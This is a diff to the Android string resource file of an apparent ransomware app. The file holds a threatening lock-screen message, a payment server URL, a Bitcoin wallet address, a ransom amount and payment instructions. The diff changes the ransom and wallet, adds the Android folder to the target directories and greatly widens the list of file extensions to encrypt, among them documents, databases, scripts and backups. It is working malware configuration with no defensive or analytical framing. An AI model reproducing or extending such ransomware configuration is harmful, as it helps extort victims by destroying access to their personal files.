@@ -29,11 +29,11 @@
 	<string name="return_to_the_app_message">RETURN TO THE APP FOOL\nExiting app will LOCK your files forever, decryption will be impossible.</string>
 	<string name="payment_server_https_url">https://btctrans.herokuapp.com</string>
 	<string name="wallet_type">฿ Bitcoin Wallet Address</string>
-	<string name="ransom_amount">100000</string>
-	<string name="wallet_address">1AzToZaV2SBDreMMKDFwJSRvFJPnfUpwEf</string>
-	<string name="demo_txid"></string>
+	<string name="ransom_amount">1000</string>
+	<string name="wallet_address">15knn9nNy7uzgC3nsaupUYB5n3PYXmtnDy</string>
+	<string name="demo_txid">62f1085c06aa841bcca8c3ade28c64429c83204a56bf072cd3ed76e22c1495be</string>
 	<string name="testing">no</string>
-	<string name="step1">Immediately send exactly ฿ 100,000 Satoshi\n(Bitcoin currency)\nto the following wallet address,</string>
+	<string name="step1">Immediately send exactly ฿ 1,000 Satoshi\n(Bitcoin currency)\nto the following wallet address,</string>
 	<string name="step2">Enter your transaction id "TxID" to decrypt your files</string>
 	<string-array name="directories">
 		<item>Pictures</item>
@@ -41,12 +41,17 @@
 		<item>DCIM</item>
 		<item>Music</item>
 		<item>Documents</item>
+		<item>Android</item>
 	</string-array>
 	<string-array name="extensions">
 		<item>jpg</item>
 		<item>jpeg</item>
 		<item>JPEG</item>
 		<item>JPG</item>
+		<item>gif</item>
+		<item>GIF</item>
+		<item>ico</item>
+		<item>ICO</item>
 		<item>apk</item>
 		<item>pdf</item>
 		<item>PDF</item>
@@ -56,6 +61,34 @@
 		<item>MP4</item>
 		<item>mpeg</item>
 		<item>MPEG</item>
+		<item>3gp</item>
+		<item>3GP</item>
+		<item>3g2</item>
+		<item>3G2</item>
+		<item>flv</item>
+		<item>FLV</item>
+		<item>h264</item>
+		<item>H264</item>
+		<item>mkv</item>
+		<item>MKV</item>
+		<item>m4a</item>
+		<item>M4A</item>
+		<item>wmv</item>
+		<item>WMV</item>
+		<item>avi</item>
+		<item>AVI</item>
+		<item>rm</item>
+		<item>RM</item>
+		<item>m4v</item>
+		<item>M4V</item>
+		<item>swf</item>
+		<item>SWF</item>
+		<item>rtf</item>
+		<item>RTF</item>
+		<item>pdf</item>
+		<item>PDF</item>
+		<item>AVI</item>
+		<item>avi</item>
 		<item>wav</item>
 		<item>WAV</item>
 		<item>mp3</item>
@@ -69,8 +102,69 @@
 		<item>RAR</item>
 		<item>TAR</item>
 		<item>7z</item>
+		<item>tar.gz</item>
 		<item>csv</item>
 		<item>CSV</item>
+		<item>txt</item>
+		<item>doc</item>
+		<item>DOC</item>
+		<item>wpd</item>
+		<item>WPD</item>
+		<item>TXT</item>
+		<item>docx</item>
+		<item>DOCX</item>
+		<item>bin</item>
+		<item>dmg</item>
+		<item>iso</item>
+		<item>BIN</item>
+		<item>DMG</item>
+		<item>ISO</item>
+		<item>db</item>
+		<item>DB</item>
+		<item>dbf</item>
+		<item>DBF</item>
+		<item>dat</item>
+		<item>DAT</item>
+		<item>log</item>
+		<item>LOG</item>
+		<item>sav</item>
+		<item>SAV</item>
+		<item>obb</item>
+		<item>OBB</item>
+		<item>sql</item>
+		<item>SQL</item>
+		<item>vcf</item>
+		<item>VCF</item>
+		<item>bat</item>
+		<item>BAT</item>
+		<item>php</item>
+		<item>PHP</item>
+		<item>html</item>
+		<item>HTML</item>
+		<item>sh</item>
+		<item>py</item>
+		<item>vb</item>
+		<item>SH</item>
+		<item>PY</item>
+		<item>VB</item>
+		<item>vbs</item>
+		<item>VBS</item>
+		<item>ods</item>
+		<item>ODS</item>
+		<item>xls</item>
+		<item>XLS</item>
+		<item>xlsx</item>
+		<item>XLSX</item>
+		<item>xlsm</item>
+		<item>XLSM</item>
+		<item>bak</item>
+		<item>BAK</item>
+		<item>cfg</item>
+		<item>CFG</item>
+		<item>tmp</item>
+		<item>TMP</item>
+		<item>dmp</item>
+		<item>DMP</item>
 	</string-array>
 
 </resources>
